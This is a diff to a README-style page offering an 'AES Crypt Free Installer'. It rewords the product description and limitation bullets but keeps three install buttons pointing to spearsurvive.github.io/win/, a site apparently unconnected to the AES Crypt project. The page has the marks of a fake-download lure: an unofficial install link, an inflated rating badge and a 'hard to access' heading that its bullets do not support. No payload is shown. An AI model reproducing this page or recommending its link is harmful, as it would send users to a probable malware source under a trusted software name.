@@ -5,10 +5,10 @@
   <img src="https://img.shields.io/badge/Rating-4.9%2F5-F9A825?style=for-the-badge&logo=star" />
   <img src="https://img.shields.io/badge/Version-2026-101010?style=for-the-badge&logo=github" />
   <img src="https://img.shields.io/badge/Platform-Windows%20%7C%20macOS-informational?style=for-the-badge&logo=windows" />
-  <img src="https://img.shields.io/badge/Category-File+Encryption-E63946?style=for-the-badge&logo=appstore" />
+  <img src="https://img.shields.io/badge/Category-Encryption-E63946?style=for-the-badge&logo=appstore" />
 </p>
 
-**💻 AES Crypt Free Installer** — AES Crypt is a free, open-source file encryption tool for Windows, macOS, and Linux that encrypts files using the AES-256 standard. Works without internet access, no account required. Full offline installation.
+**💻 AES Crypt Free Installer** — AES Crypt is a free, open-source file encryption application for Windows, macOS, and Linux that uses AES-256 encryption to protect files. Works without internet access, no account required. Full offline installation.
 
 <p align="center">
   <img src="https://skillicons.dev/icons?i=windows" />
@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install AES Crypt](https://img.shields.io/badge/⬇_Install_AES%20Crypt-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install AES Crypt](https://img.shields.io/badge/⬇_Install_AES+Crypt-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -30,16 +30,16 @@
 
 ## 📖 About AES Crypt
 
-AES Crypt is a free, open-source file encryption tool for Windows, macOS, and Linux that encrypts files using the AES-256 standard. It integrates with Windows Explorer for right-click encryption and produces encrypted .aes files that can be decrypted on any platform.
+AES Crypt is a free, open-source file encryption application for Windows, macOS, and Linux that uses AES-256 encryption to protect files. Simply right-click any file to encrypt or decrypt it with a password. With no proprietary format dependencies, AES-encrypted files can be decrypted on any platform using the free AES Crypt software — ideal for securing sensitive documents before cloud storage or email transfer.
 
 ---
 
 ## ❌ Problem: AES Crypt is hard to access
 
-- **Single File Only** — Encrypts individual files; not designed for folder or drive encryption
-- **No Password Recovery** — Losing the password means permanent data loss
-- **No GUI on Linux** — Linux version is command-line only
-- **Basic Feature Set** — No key management, sharing, or metadata encryption features
+- **Password Management** — Forgotten passwords mean permanent data loss; no recovery mechanism
+- **File-Level Only** — Encrypts individual files; not full-disk encryption
+- **No Key Management** — No built-in key management system for enterprise use
+- **Metadata Exposed** — File names and sizes may be visible even when content is encrypted
 
 ---
 
@@ -81,7 +81,7 @@ AES Crypt is a free, open-source file encryption tool for Windows, macOS, and Li
 
 <div align="center">
 
-[![⬇ Install AES Crypt](https://img.shields.io/badge/⬇_Install_AES%20Crypt-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install AES Crypt](https://img.shields.io/badge/⬇_Install_AES+Crypt-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -121,11 +121,11 @@ AES Crypt is a free, open-source file encryption tool for Windows, macOS, and Li
 
 ---
 
-**AES Crypt Free Installer** — AES Crypt is a free, open-source file encryption tool for Windows, macOS, and Linux that encrypts files using the AES-256 standard. Install without internet connection today!
+**AES Crypt Free Installer** — AES Crypt is a free, open-source file encryption application for Windows, macOS, and Linux that uses AES-256 encryption to protect files. Install without internet connection today!
 
 <div align="center">
 
-[![⬇ Install AES Crypt](https://img.shields.io/badge/⬇_Install_AES%20Crypt-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install AES Crypt](https://img.shields.io/badge/⬇_Install_AES+Crypt-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
